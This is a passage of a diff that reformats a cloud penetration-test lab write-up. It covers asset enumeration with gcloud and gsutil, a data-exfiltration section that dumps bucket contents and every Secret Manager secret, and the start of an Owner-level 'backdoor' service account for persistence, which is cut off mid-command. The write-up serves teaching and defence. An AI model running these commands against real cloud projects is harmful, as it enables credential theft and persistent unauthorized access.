-<p>**Modify IAM Policies:**Grant ourselves or others additional permissions</p>
+<p><strong>Modify IAM Policies:</strong> Grant ourselves or others additional permissions</p>
 </li>
 <li class="">
-<p>**Access All Data:**Read any data stored in the project</p>
+<p><strong>Access All Data:</strong> Read any data stored in the project</p>
 </li>
 <li class="">
-<p>**Billing Control:**Modify billing settings</p>
+<p><strong>Billing Control:</strong> Modify billing settings</p>
 </li>
 <li class="">
-<p>**Project Deletion:**Delete the entire project</p>
+<p><strong>Project Deletion:</strong> Delete the entire project</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-this-happens-1">Why This Happens<a href="#why-this-happens-1" class="hash-link" aria-label="Direct link to Why This Happens" title="Direct link to Why This Happens" translate="no">​</a></h3>
 <p>Overprivileged service accounts are common due to:</p>
 <ul>
 <li class="">
-<p>**Convenience:**Developers grant broad permissions to avoid permission errors</p>
+<p><strong>Convenience:</strong> Developers grant broad permissions to avoid permission errors</p>
 </li>
 <li class="">
-<p>**Lack of Understanding:**Not understanding the principle of least privilege</p>
+<p><strong>Lack of Understanding:</strong> Not understanding the principle of least privilege</p>
 </li>
 <li class="">
-<p>**Copy-Paste Configurations:**Reusing configurations from other projects</p>
+<p><strong>Copy-Paste Configurations:</strong> Reusing configurations from other projects</p>
 </li>
 <li class="">
-<p>**Testing Environments:**Permissive configurations left in production</p>
+<p><strong>Testing Environments:</strong> Permissive configurations left in production</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mitigation-5">Mitigation<a href="#mitigation-5" class="hash-link" aria-label="Direct link to Mitigation" title="Direct link to Mitigation" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>**Principle of Least Privilege:**Grant only the minimum required permissions</p>
+<p><strong>Principle of Least Privilege:</strong> Grant only the minimum required permissions</p>
 </li>
 <li class="">
-<p>**Regular Audits:**Regularly review IAM policies and service account permissions</p>
+<p><strong>Regular Audits:</strong> Regularly review IAM policies and service account permissions</p>
 </li>
 <li class="">
-<p>**Use Predefined Roles:**Prefer predefined roles over custom roles when possible</p>
+<p><strong>Use Predefined Roles:</strong> Prefer predefined roles over custom roles when possible</p>
 </li>
 <li class="">
-<p>**Separate Service Accounts:**Use different service accounts for different purposes</p>
+<p><strong>Separate Service Accounts:</strong> Use different service accounts for different purposes</p>
 </li>
 <li class="">
-<p>**Monitor Usage:**Set up alerts for high-privilege service account usage</p>
+<p><strong>Monitor Usage:</strong> Set up alerts for high-privilege service account usage</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="8-asset-discovery">8. Asset Discovery<a href="#8-asset-discovery" class="hash-link" aria-label="Direct link to 8. Asset Discovery" title="Direct link to 8. Asset Discovery" translate="no">​</a></h2>
@@ -519,104 +519,104 @@
 <p>With Owner-level access, we can now enumerate all resources in the cloud environment to understand the complete attack surface and identify additional targets.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="methodology-1">Methodology<a href="#methodology-1" class="hash-link" aria-label="Direct link to Methodology" title="Direct link to Methodology" translate="no">​</a></h3>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="compute-instances">Compute Instances<a href="#compute-instances" class="hash-link" aria-label="Direct link to Compute Instances" title="Direct link to Compute Instances" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud compute instances list </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--format=json</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud compute instances list --format=json</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
 <li class="">
-<p><code>web-server-97d005e2</code>- RUNNING (Public IP: 34.45.163.97)</p>
+<p><code>web-server-97d005e2</code> - RUNNING (Public IP: 34.45.163.97)</p>
 </li>
 <li class="">
-<p><code>db-server-97d005e2</code>- RUNNING (Internal IP only)</p>
+<p><code>db-server-97d005e2</code> - RUNNING (Internal IP only)</p>
 </li>
 </ul>
-<p>**Analysis:**Two virtual machines are running. The web server has a public IP, making it accessible from the internet. The database server is internal-only, which is a good security practice, but we might be able to access it through the web server or other internal services.</p>
+<p><strong>Analysis:</strong> Two virtual machines are running. The web server has a public IP, making it accessible from the internet. The database server is internal-only, which is a good security practice, but we might be able to access it through the web server or other internal services.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="storage-buckets">Storage Buckets<a href="#storage-buckets" class="hash-link" aria-label="Direct link to Storage Buckets" title="Direct link to Storage Buckets" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gsutil </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ls</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gsutil ls</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
 <li class="">
-<p><code>gs://vulnerable-bucket-97d005e2/</code>- Contains sensitive data</p>
+<p><code>gs://vulnerable-bucket-97d005e2/</code> - Contains sensitive data</p>
 </li>
 <li class="">
-<p><code>gs://gcf-sources-265209566722-us-central1/</code>- Cloud Function source code</p>
+<p><code>gs://gcf-sources-265209566722-us-central1/</code> - Cloud Function source code</p>
 </li>
 </ul>
-<p>**Analysis:**Multiple storage buckets exist. The vulnerable bucket contains sensitive files, and the GCF sources bucket contains the Cloud Function code, which could reveal additional vulnerabilities.</p>
+<p><strong>Analysis:</strong> Multiple storage buckets exist. The vulnerable bucket contains sensitive files, and the GCF sources bucket contains the Cloud Function code, which could reveal additional vulnerabilities.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="secrets-in-secret-manager">Secrets in Secret Manager<a href="#secrets-in-secret-manager" class="hash-link" aria-label="Direct link to Secrets in Secret Manager" title="Direct link to Secrets in Secret Manager" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud secrets list </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--format=json</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud secrets list --format=json</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
 <li class="">
-<p><code>exposed-sa-key-97d005e2</code>- Service account key (already extracted)</p>
+<p><code>exposed-sa-key-97d005e2</code> - Service account key (already extracted)</p>
 </li>
 <li class="">
-<p><code>exposed-sa-key-ac287ecf</code>- Additional service account key</p>
+<p><code>exposed-sa-key-ac287ecf</code> - Additional service account key</p>
 </li>
 </ul>
-<p>**Analysis:**Multiple service account keys are stored in Secret Manager. Each key represents a potential attack vector if extracted.</p>
+<p><strong>Analysis:</strong> Multiple service account keys are stored in Secret Manager. Each key represents a potential attack vector if extracted.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="service-accounts">Service Accounts<a href="#service-accounts" class="hash-link" aria-label="Direct link to Service Accounts" title="Direct link to Service Accounts" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud iam service-accounts list </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--format=json</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud iam service-accounts list --format=json</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
 <li class="">
-<p><code>overprivileged-sa-97d005e2@cloud-pentest-lab-1769707855.iam.gserviceaccount.com</code>- Overprivileged (Owner)</p>
+<p><code>overprivileged-sa-97d005e2@cloud-pentest-lab-1769707855.iam.gserviceaccount.com</code> - Overprivileged (Owner)</p>
 </li>
 <li class="">
-<p><code>cloud-pentest-lab-1769707855@appspot.gserviceaccount.com</code>- App Engine default</p>
+<p><code>cloud-pentest-lab-1769707855@appspot.gserviceaccount.com</code> - App Engine default</p>
 </li>
 <li class="">
-<p><code>265209566722-compute@developer.gserviceaccount.com</code>- Compute Engine default</p>
+<p><code>265209566722-compute@developer.gserviceaccount.com</code> - Compute Engine default</p>
 </li>
 </ul>
-<p>**Analysis:**Multiple service accounts exist. The default service accounts often have Editor role, which is also highly privileged.</p>
+<p><strong>Analysis:</strong> Multiple service accounts exist. The default service accounts often have Editor role, which is also highly privileged.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="cloud-functions">Cloud Functions<a href="#cloud-functions" class="hash-link" aria-label="Direct link to Cloud Functions" title="Direct link to Cloud Functions" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">functions</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> list --format=json</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud functions list --format=json</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
-<li class=""><code>vulnerable-function-97d005e2</code>- The function we already exploited</li>
+<li class=""><code>vulnerable-function-97d005e2</code> - The function we already exploited</li>
 </ul>
-<p>**Analysis:**Only one Cloud Function exists, which we’ve already compromised.</p>
+<p><strong>Analysis:</strong> Only one Cloud Function exists, which we’ve already compromised.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="cloud-run-services">Cloud Run Services<a href="#cloud-run-services" class="hash-link" aria-label="Direct link to Cloud Run Services" title="Direct link to Cloud Run Services" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud run services list </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--format=json</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud run services list --format=json</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
-<li class=""><code>vulnerable-api-97d005e2</code>- Publicly accessible API</li>
+<li class=""><code>vulnerable-api-97d005e2</code> - Publicly accessible API</li>
 </ul>
-<p>**Analysis:**A Cloud Run service is running, which might have its own vulnerabilities.</p>
+<p><strong>Analysis:</strong> A Cloud Run service is running, which might have its own vulnerabilities.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-asset-discovery-matters">Why Asset Discovery Matters<a href="#why-asset-discovery-matters" class="hash-link" aria-label="Direct link to Why Asset Discovery Matters" title="Direct link to Why Asset Discovery Matters" translate="no">​</a></h3>
 <p>Comprehensive asset discovery is crucial because:</p>
 <ul>
 <li class="">
-<p>**Complete Picture:**Understanding all resources helps identify all attack vectors</p>
+<p><strong>Complete Picture:</strong> Understanding all resources helps identify all attack vectors</p>
 </li>
 <li class="">
-<p>**Lateral Movement:**Knowing what resources exist helps plan lateral movement</p>
+<p><strong>Lateral Movement:</strong> Knowing what resources exist helps plan lateral movement</p>
 </li>
 <li class="">
-<p>**Data Location:**Identifying where sensitive data is stored</p>
+<p><strong>Data Location:</strong> Identifying where sensitive data is stored</p>
 </li>
 <li class="">
-<p>**Attack Surface:**Each discovered resource is a potential target</p>
+<p><strong>Attack Surface:</strong> Each discovered resource is a potential target</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="9-data-exfiltration">9. Data Exfiltration<a href="#9-data-exfiltration" class="hash-link" aria-label="Direct link to 9. Data Exfiltration" title="Direct link to 9. Data Exfiltration" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="objective-8">Objective<a href="#objective-8" class="hash-link" aria-label="Direct link to Objective" title="Direct link to Objective" translate="no">​</a></h3>
 <p>With full project access, we can now extract all sensitive data, including credentials, configuration files, and any other valuable information.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="storage-bucket-extraction">Storage Bucket Extraction<a href="#storage-bucket-extraction" class="hash-link" aria-label="Direct link to Storage Bucket Extraction" title="Direct link to Storage Bucket Extraction" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">mkdir</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -p bucket_contents</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">gsutil -m </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">cp</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -r </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;gs://vulnerable-bucket-97d005e2/*&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> bucket_contents/</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">mkdir -p bucket_contents</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">gsutil -m cp -r &quot;gs://vulnerable-bucket-97d005e2/*&quot; bucket_contents/</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
 <li class="">
-<p><code>function-code.zip</code>- Cloud Function source code</p>
+<p><code>function-code.zip</code> - Cloud Function source code</p>
 </li>
 <li class="">
-<p><code>secrets/database-credentials.json</code>- Database credentials</p>
+<p><code>secrets/database-credentials.json</code> - Database credentials</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="database-credentials">Database Credentials<a href="#database-credentials" class="hash-link" aria-label="Direct link to Database Credentials" title="Direct link to Database Credentials" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">cat</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> bucket_contents/secrets/database-credentials.json</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">cat bucket_contents/secrets/database-credentials.json</span><br></div></code></pre></div></div>
 <p><strong>Extracted Data:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;api_key&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;stripe_live_example_97d005e2&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;db_host&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;internal-db-97d005e2&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;db_password&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;EXAMPLE_PASSWORD_123!&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;db_user&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;admin&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;api_key&quot;: &quot;stripe_live_example_97d005e2&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;db_host&quot;: &quot;internal-db-97d005e2&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;db_password&quot;: &quot;EXAMPLE_PASSWORD_123!&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;db_user&quot;: &quot;admin&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
 <p><strong>Analysis:</strong></p>
 <ul>
 <li class="">
@@ -626,51 +626,51 @@
 <p>**Database Credentials:**Weak password<code>EXAMPLE_PASSWORD_123!</code>- Easily guessable</p>
 </li>
 <li class="">
-<p>**Database Host:**Internal hostname — Could be accessed from within the network</p>
+<p><strong>Database Host:</strong> Internal hostname — Could be accessed from within the network</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="secret-manager-extraction">Secret Manager Extraction<a href="#secret-manager-extraction" class="hash-link" aria-label="Direct link to Secret Manager Extraction" title="Direct link to Secret Manager Extraction" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">mkdir</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -p secret_manager</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> secret </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">in</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> $(gcloud secrets list --format=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;value(name)&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">); </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  SECRET_ID=$(</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">basename</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$secret</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  gcloud secrets versions access latest --secret=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$SECRET_ID</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> &gt; </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;secret_manager/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$SECRET_ID</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.txt&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">mkdir -p secret_manager</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for secret in $(gcloud secrets list --format=&quot;value(name)&quot;); do</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  SECRET_ID=$(basename &quot;$secret&quot;)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  gcloud secrets versions access latest --secret=&quot;$SECRET_ID&quot; &gt; &quot;secret_manager/$SECRET_ID.txt&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">done</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
 <li class="">
-<p><code>exposed-sa-key-97d005e2</code>- Service account key (already extracted)</p>
+<p><code>exposed-sa-key-97d005e2</code> - Service account key (already extracted)</p>
 </li>
 <li class="">
-<p><code>exposed-sa-key-ac287ecf</code>- Additional service account key (access denied for some)</p>
+<p><code>exposed-sa-key-ac287ecf</code> - Additional service account key (access denied for some)</p>
 </li>
 </ul>
-<p>**Analysis:**Multiple service account keys were stored, indicating a pattern of credential mismanagement.</p>
+<p><strong>Analysis:</strong> Multiple service account keys were stored, indicating a pattern of credential mismanagement.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="impact-of-data-exfiltration">Impact of Data Exfiltration<a href="#impact-of-data-exfiltration" class="hash-link" aria-label="Direct link to Impact of Data Exfiltration" title="Direct link to Impact of Data Exfiltration" translate="no">​</a></h3>
 <p>Exfiltrated data can be used for:</p>
 <ul>
 <li class="">
-<p>**Further Attacks:**Credentials can be used to access other systems</p>
+<p><strong>Further Attacks:</strong> Credentials can be used to access other systems</p>
 </li>
 <li class="">
-<p>**Data Breach:**Sensitive information can be sold or used maliciously</p>
+<p><strong>Data Breach:</strong> Sensitive information can be sold or used maliciously</p>
 </li>
 <li class="">
-<p>**Compliance Violations:**Data breaches may violate regulations (GDPR, HIPAA, etc.)</p>
+<p><strong>Compliance Violations:</strong> Data breaches may violate regulations (GDPR, HIPAA, etc.)</p>
 </li>
 <li class="">
-<p>**Reputation Damage:**Public disclosure of breaches damages organizational reputation</p>
+<p><strong>Reputation Damage:</strong> Public disclosure of breaches damages organizational reputation</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-data-exfiltration-is-critical">Why Data Exfiltration is Critical<a href="#why-data-exfiltration-is-critical" class="hash-link" aria-label="Direct link to Why Data Exfiltration is Critical" title="Direct link to Why Data Exfiltration is Critical" translate="no">​</a></h3>
 <p>Data exfiltration represents the ultimate goal of many attacks because:</p>
 <ul>
 <li class="">
-<p>**Monetary Value:**Stolen credentials and data have value on the black market</p>
+<p><strong>Monetary Value:</strong> Stolen credentials and data have value on the black market</p>
 </li>
 <li class="">
-<p>**Extended Access:**Credentials can provide access to other systems</p>
+<p><strong>Extended Access:</strong> Credentials can provide access to other systems</p>
 </li>
 <li class="">
-<p>**Intelligence Gathering:**Understanding system architecture and configurations</p>
+<p><strong>Intelligence Gathering:</strong> Understanding system architecture and configurations</p>
 </li>
 <li class="">
-<p>**Proof of Compromise:**Demonstrates successful breach for reporting</p>
+<p><strong>Proof of Compromise:</strong> Demonstrates successful breach for reporting</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="10-persistence-establishment">10. Persistence Establishment<a href="#10-persistence-establishment" class="hash-link" aria-label="Direct link to 10. Persistence Establishment" title="Direct link to 10. Persistence Establishment" translate="no">​</a></h2>
@@ -678,64 +678,64 @@
 <p>To maintain access even if primary attack vectors are discovered and patched, we establish persistent backdoor access by creating a new service account with Owner permissions.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="backdoor-creation">Backdoor Creation<a href="#backdoor-creation" class="hash-link" aria-label="Direct link to Backdoor Creation" title="Direct link to Backdoor Creation" translate="no">​</a></h3>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-1-create-service-account">Step 1: Create Service Account<a href="#step-1-create-service-account" class="hash-link" aria-label="Direct link to Step 1: Create Service Account" title="Direct link to Step 1: Create Service Account" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">BACKDOOR_SA=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;backdoor-sa-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$(date +%s)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">gcloud iam service-accounts create </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$BACKDOOR_SA</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --display-name=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Backdoor 